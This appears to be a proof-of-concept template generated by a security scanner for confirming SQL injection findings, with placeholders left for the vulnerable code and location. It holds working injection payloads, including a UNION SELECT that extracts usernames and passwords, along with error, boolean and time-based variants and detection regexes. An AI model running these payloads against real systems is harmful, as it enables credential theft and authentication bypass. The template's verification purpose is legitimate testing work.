#!/usr/bin/env python3
"""
PoC Template: SQL Injection (Python)
Auto-generated from ZeroKit finding

Vulnerability: {{CATEGORY}}
Location: {{FILE}}:{{LINE}}
"""

import sys
import re

print("=" * 50)
print("🎯 PoC: SQL Injection (Python)")
print(f"Location: {{{{FILE}}}}:{{{{LINE}}}}")
print("=" * 50)
print()

# =====================================================
# EXPLOIT PAYLOADS
# =====================================================
payload_boolean = "' OR '1'='1' -- "
payload_union = "' UNION SELECT NULL, username, password FROM users -- "
payload_error = "' AND 1=CAST((SELECT @@version) AS INT) -- "
payload_time = "'; WAITFOR DELAY '00:00:05' -- "

print(f"[*] Testing SQL injection: {payload_boolean}")

# =====================================================
# VULNERABLE CODE EXECUTION
# =====================================================
try:
    {{VULNERABLE_CODE}}
    
    # =====================================================
    # VERIFICATION
    # =====================================================
    success = False
    
    # Check for SQL error messages
    sql_errors = [
        r'SQL syntax',
        r'mysql_fetch',
        r'sqlite3\.',
        r'psycopg2\.',
        r'ORA-\d+',
        r'DB2 SQL error'
    ]
    
    for error_pattern in sql_errors:
        if re.search(error_pattern, str(output), re.IGNORECASE):
            print("✅ VULNERABILITY CONFIRMED: SQL error detected")
            success = True
            break
    
    # Check for unauthorized data
    if re.search(r'(admin|root|password|token|session)', str(output), re.IGNORECASE):
        print("✅ VULNERABILITY CONFIRMED: Unauthorized data extracted")
        success = True
    
    # Check for boolean injection success
    if "True" in str(output) or len(str(output)) > 100:
        print("✅ VULNERABILITY CONFIRMED: Boolean-based injection")
        success = True
    
    # =====================================================
    # RESULT
    # =====================================================
    print("\n" + "=" * 50)
    if success:
        print("🚨 RESULT: EXPLOITABLE (SQL Injection)")
        print(f"Severity: {{{{SEVERITY}}}}")
        print("Impact: Data breach, authentication bypass")
        sys.exit(0)
    else:
        print("❌ RESULT: NOT EXPLOITABLE")
        print("Parameterized queries or sanitization present")
        sys.exit(1)

except Exception as e:
    print(f"❌ Exception during test: {e}")
    sys.exit(1)
